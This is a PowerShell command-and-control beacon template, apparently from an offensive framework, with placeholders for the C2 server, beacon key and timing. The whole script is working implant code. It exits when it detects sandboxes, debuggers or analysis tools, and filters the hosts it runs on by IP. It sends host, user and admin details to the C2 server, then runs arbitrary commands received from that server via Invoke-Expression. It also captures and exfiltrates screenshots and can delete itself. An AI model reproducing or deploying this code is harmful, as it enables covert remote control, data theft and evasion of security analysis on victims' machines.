$C2_URL = "{{C2_URL}}"
$BEACON_ID = "{{BEACON_ID}}"
$BEACON_KEY = "{{BEACON_KEY}}"
$SLEEP = {{SLEEP}}
$JITTER = {{JITTER}}
$ALLOWED_IPS = "{{ALLOWED_IPS}}"
$BLOCKED_IPS = "{{BLOCKED_IPS}}"

$OS_INFO = [System.Environment]::OSVersion.VersionString + " " + [System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture

# Sandbox detection
function Test-Sandbox {
    $sandboxProcs = @("wireshark","fiddler","procmon","procmon64","procexp","procexp64","x32dbg","x64dbg","ollydbg","windbg","idaq","idaq64","pestudio","sandboxie","sbiectrl","cuckoomon","joeboxcontrol","joeboxserver","dumpcap","httpdebugger","fakenet","apimonitor")
    $sandboxHosts = @("SANDBOX","CUCKOO","TEQUILA","FVFF1M7J","WILEYPC","INTELPRO","FLAREVM","TPMNOTIFY","REMNUX")
    $sandboxUsers = @("sandbox","cuckoo","CurrentUser","WDAGUtilityAccount","hapubws","maltest","malnetvm","yfkol","remnux")

    $hn = [System.Environment]::MachineName.ToUpper()
    $un = [System.Environment]::UserName.ToLower()

    foreach ($p in $sandboxHosts) { if ($hn -eq $p) { return $true } }
    foreach ($p in $sandboxUsers) { if ($un -eq $p) { return $true } }

    try {
        $procs = (Get-Process).ProcessName | ForEach-Object { $_.ToLower() }
        foreach ($sp in $sandboxProcs) { if ($procs -contains $sp) { return $true } }
    } catch {}

    try {
        $uptime = [System.Environment]::TickCount64
        if ($uptime -lt (30 * 60 * 1000)) { return $true }
    } catch {}

    if ([System.Environment]::ProcessorCount -lt 2) { return $true }

    try {
        $mem = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
        if ($mem -lt 2GB) { return $true }
    } catch {}

    # Check TEMP dir file count
    try {
        $tmpFiles = (Get-ChildItem $env:TEMP -ErrorAction SilentlyContinue).Count
        if ($tmpFiles -lt 10) { return $true }
    } catch {}

    # Check sandbox services
    try {
        foreach ($svc in @("SbieSvc","CuckooMon","Joeboxserver","cmdvirth")) {
            $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
            if ($s -and $s.Status -eq "Running") { return $true }
        }
    } catch {}

    return $false
}

function Test-IPFilter {
    if (-not $ALLOWED_IPS -and -not $BLOCKED_IPS) { return $true }
    # Local interface addresses only; no third-party IP echo service.
    try {
        $localIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -ExpandProperty IPAddress)
    } catch {
        try {
            $localIPs = @([System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | ForEach-Object { $_.IPAddressToString })
        } catch { return $true }
    }
    if (-not $localIPs -or $localIPs.Count -eq 0) { return $true }

    foreach ($publicIP in $localIPs) {
        try { $ip = [System.Net.IPAddress]::Parse($publicIP) } catch { continue }
        if ($BLOCKED_IPS) {
            foreach ($entry in $BLOCKED_IPS.Split("|")) {
                $entry = $entry.Trim()
                if (-not $entry) { continue }
                if ($entry -match "/") {
                    $parts = $entry.Split("/"); $net = [System.Net.IPAddress]::Parse($parts[0]); $prefix = [int]$parts[1]
                    $ipBytes = $ip.GetAddressBytes(); $netBytes = $net.GetAddressBytes()
                    $match = $true; $bits = $prefix
                    for ($i = 0; $i -lt $ipBytes.Length -and $bits -gt 0; $i++) {
                        $mask = if ($bits -ge 8) { 0xFF } else { (0xFF -shl (8 - $bits)) -band 0xFF }
                        if (($ipBytes[$i] -band $mask) -ne ($netBytes[$i] -band $mask)) { $match = $false; break }
                        $bits -= 8
                    }
                    if ($match) { return $false }
                } elseif ($publicIP -eq $entry) { return $false }
            }
        }
        if ($ALLOWED_IPS) {
            foreach ($entry in $ALLOWED_IPS.Split("|")) {
                $entry = $entry.Trim()
                if (-not $entry) { continue }
                if ($entry -match "/") {
                    $parts = $entry.Split("/"); $net = [System.Net.IPAddress]::Parse($parts[0]); $prefix = [int]$parts[1]
                    $ipBytes = $ip.GetAddressBytes(); $netBytes = $net.GetAddressBytes()
                    $match = $true; $bits = $prefix
                    for ($i = 0; $i -lt $ipBytes.Length -and $bits -gt 0; $i++) {
                        $mask = if ($bits -ge 8) { 0xFF } else { (0xFF -shl (8 - $bits)) -band 0xFF }
                        if (($ipBytes[$i] -band $mask) -ne ($netBytes[$i] -band $mask)) { $match = $false; break }
                        $bits -= 8
                    }
                    if ($match) { return $true }
                } elseif ($publicIP -eq $entry) { return $true }
            }
        }
    }
    if ($ALLOWED_IPS) { return $false }
    return $true
}

Start-Sleep -Seconds 10
if (Test-Sandbox) { exit }
if (-not (Test-IPFilter)) { exit }


function Get-HostInfo {
    $info = @{
        beacon_id    = $BEACON_ID
        hostname     = [System.Environment]::MachineName
        username     = [System.Environment]::UserName
        domain       = [System.Environment]::UserDomainName
        os           = $OS_INFO
        arch         = if ([System.Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
        pid          = $PID
        process_name = (Get-Process -Id $PID).ProcessName
        is_admin     = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        internal_ip  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1).IPAddress
    }
    return $info
}

# HMAC-SHA256 request authentication (matches the C2 beacon protocol)
function Get-AuthHeaders {
    param([string]$Body)
    $ts = [DateTimeOffset]::Now.ToUnixTimeSeconds()
    $nonce = [guid]::NewGuid().ToString("N").Substring(0, 16)
    $hmac = New-Object System.Security.Cryptography.HMACSHA256(,[System.Text.Encoding]::UTF8.GetBytes($BEACON_KEY))
    $sigBytes = [System.Text.Encoding]::UTF8.GetBytes("$ts.$nonce." + $Body)
    $sig = [System.BitConverter]::ToString($hmac.ComputeHash($sigBytes)).Replace("-", "").ToLower()
    return @{
        "X-Beacon-ID"        = $BEACON_ID
        "X-Beacon-OS"        = $OS_INFO
        "X-Beacon-Timestamp" = "$ts"
        "X-Beacon-Nonce"     = $nonce
        "X-Beacon-Sign"      = $sig
    }
}

# Register with C2
function Register-Beacon {
    try {
        $Body = Get-HostInfo | ConvertTo-Json -Depth 3
        $Headers = Get-AuthHeaders -Body $Body
        $Resp = Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json" -Headers $Headers -ErrorAction Stop
        if ($Resp -eq "__TERMINATE__") { exit }
    } catch {}
}

function Get-CheckIn {
    try {
        $Body = '{"type":"poll"}'
        $Headers = Get-AuthHeaders -Body $Body
        $Response = Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json" -Headers $Headers -ErrorAction Stop
        return $Response
    } catch {
        return $null
    }
}

function Send-Result {
    param($TaskID, $Output)
    try {
        $Body = @{
            task_id = $TaskID
            output = $Output
            beacon_id = $BEACON_ID
        } | ConvertTo-Json
        $Headers = Get-AuthHeaders -Body $Body
        Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json" -Headers $Headers
    } catch {}
}

function Invoke-Screenshot {
    try {
        if (-not ("PrtStrike.Native" -as [type])) {
            Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class PrtStrikeNative {
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetProcessDpiAwarenessContext(IntPtr dpiContext);

    [DllImport("shcore.dll")]
    public static extern int SetProcessDpiAwareness(int awareness);
}
"@
        }

        try {
            [void][PrtStrikeNative]::SetProcessDpiAwarenessContext([IntPtr](-4))
        } catch {
            try {
                [void][PrtStrikeNative]::SetProcessDpiAwareness(2)
            } catch {
                try { [void][PrtStrikeNative]::SetProcessDPIAware() } catch {}
            }
        }

        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms

        # Capture all monitors (virtual screen)
        $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        $graphics.Dispose()

        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bmp.Dispose()

        $b64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREENSHOT:" + $b64
    } catch {
        return "Error: screenshot failed: " + $_.Exception.Message
    }
}

# Initial registration
Register-Beacon

while ($true) {
    # Sleep with Jitter
    $SleepMs = $SLEEP * 1000
    $JitterMs = $SleepMs * ($JITTER / 100)
    $ActualSleep = $SleepMs + (Get-Random -Min (-$JitterMs) -Max $JitterMs)
    if ($ActualSleep -lt 100) { $ActualSleep = 100 }
    Start-Sleep -Milliseconds $ActualSleep

    $Data = Get-CheckIn

    if ($Data) {
        if ($Data -is [string] -and $Data -eq "__TERMINATE__") {
            exit
        }
        if ($Data -is [string] -and $Data.StartsWith("SLEEP ")) {
            $Parts = $Data.Split(" ")
            if ($Parts.Length -ge 3) {
                $SLEEP = [int]$Parts[1]
                $JITTER = [int]$Parts[2]
            }
        } elseif ($Data -is [array]) {
            foreach ($Task in $Data) {
                if ($Task.command -eq "__UNINSTALL__") {
                    Send-Result -TaskID $Task.id -Output "UNINSTALLED"
                    # Script stagers carry no persistence; remove the script itself (best effort) and exit.
                    try { Remove-Item -Force $PSCommandPath -ErrorAction SilentlyContinue } catch {}
                    exit
                }
                if ($Task.command -eq "__EXIT__") {
                    Send-Result -TaskID $Task.id -Output "BEACON_TERMINATED"
                    exit
                }
                $Output = ""
                try {
                    # Handle built-in commands
                    if ($Task.command -eq "pwd" -or $Task.command -eq "cwd") {
                        $Output = (Get-Location).Path
                    } elseif ($Task.command.StartsWith("cd ")) {
                        $Dir = $Task.command.Substring(3).Trim()
                        Set-Location $Dir
                        $Output = "Changed directory to: " + (Get-Location).Path
                    } elseif ($Task.command -eq "__SCREENSHOT__") {
                        $Output = Invoke-Screenshot
                    } else {
                        $Output = Invoke-Expression $Task.command 2>&1 | Out-String
                    }
                } catch {
                    $Output = $_.Exception.Message
                }
                Send-Result -TaskID $Task.id -Output $Output
            }
        }
    }
}
